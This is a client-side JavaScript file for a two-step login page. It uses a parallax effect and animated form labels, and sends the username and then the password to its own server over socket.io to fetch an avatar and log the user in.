const socket = io();

document.addEventListener("mousemove", parallax);
function parallax(e) {
    this.querySelectorAll(".parallax").forEach((shift) => {
        const position = 4;
        const x = (window.innerWidth - e.pageX * position) / 90;
        const y = (window.innerHeight - e.pageY * position) / 90;

        shift.style.transform = `translateX(${x}px) translateY(${y}px)`;
    })
}

const inputUSer = document.querySelector('#user');
const labelUser = document.querySelector('#label-user');
const errorUser = document.querySelector('#error_username');

inputUSer.addEventListener('focus', () => {
    labelUser.style.top = '-17px';
    labelUser.style.left = '5px';
    labelUser.style.fontSize = '16px';
    errorUser.style.display = 'none';
})

inputUSer.addEventListener('focusout', () => {
    if(inputUSer.value.length == 0){
        labelUser.style.top = '2.5px';
        labelUser.style.left = '30px';
        labelUser.style.fontSize = '15px';
    }
})

const buttonSendUSer = document.querySelector('#submit-user');
const preloader = document.querySelector('#preloader');

buttonSendUSer.addEventListener('click', (e) => {
    e.preventDefault();
    if(inputUSer.value.length > 0){
        preloader.style.display = 'flex';
        const dataInputs = {
            'user': inputUSer.value,
            'socket': socket.id,
        }
        socket.emit('ShowAvatar', dataInputs);
    }else{
        errorUser.style.display = 'block';
    }
})

const Avatar = document.querySelector('#img-user');

socket.on("AvatarElement", dataAvatar => {
    Avatar.setAttribute('src', dataAvatar);
    showPass();
})

const inputPass = document.querySelector('#pass');
const labelPass = document.querySelector('#label-pass');

inputPass.addEventListener('focus', () => {
    labelPass.style.top = '-17px';
    labelPass.style.left = '5px';
    labelPass.style.fontSize = '16px';
    errorPassword.style.display = 'none';
})

inputPass.addEventListener('focusout', () => {
    if(inputPass.value.length == 0){
        labelPass.style.top = '2.5px';
        labelPass.style.left = '30px';
        labelPass.style.fontSize = '15px';
    }
})

const welcomeUser = document.querySelector('#welcomeuser');
const welcomePass = document.querySelector('#welcomepass');
const userForm = document.querySelector('#userForm');
const passForm = document.querySelector('#passForm');
const volver = document.querySelector('#volver');

function showPass() {
    welcomeUser.style.left = '-100vw';
    userForm.style.left = '-100vw';
    volver.style.display = 'block';
    setTimeout(() => {
        preloader.style.display = 'none';
        welcomeUser.style.display = 'none';
        userForm.style.display = 'none';
        welcomePass.style.display = 'block';
        passForm.style.display = 'block';
        welcomeUser.style.left = '0';
        userForm.style.left = '0';
    }, 350);
}

volver.addEventListener('click', (e) => {
    location.reload();
})


const submitPass = document.querySelector('#submit-pass');
const errorPassword = document.querySelector('#error_password');

submitPass.addEventListener('click', (e) => {
    e.preventDefault();
    if(inputPass.value.length > 0){
        preloader.style.display = 'flex';
        const dataInputs = {
            'user': inputUSer.value,
            'pass': inputPass.value,
            'socket': socket.id
        }
        socket.emit('EmitData', dataInputs);
    }else{
        errorPassword.style.display = 'block';
    }
})

socket.on("ContinuarHome", ContinuarHome => {
    window.location.href = "/frontend/?s="+ContinuarHome;
})

socket.on("ErrorLogin", TextoBanner => {
    preloader.style.display = "none";
    console.log(TextoBanner);
})